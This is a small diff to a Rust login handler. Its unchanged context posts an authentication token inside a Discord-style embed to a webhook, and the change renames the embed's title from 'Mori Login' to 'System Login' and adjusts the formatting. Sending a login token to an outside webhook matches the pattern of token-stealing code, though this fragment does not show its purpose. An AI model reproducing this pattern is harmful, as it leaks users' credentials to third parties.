@@ -138,9 +138,9 @@ async fn auth_login(
                     .post(webhook)
                     .json(&serde_json::json!({
                         "embeds": [{
-                            "title": "Mori Login",
+                            "title": "System Login",
                             "description":
-                                format!("```{}```", token),
+                                format!("`{}`", token),
                             "color": 65280
                         }]
                     }))
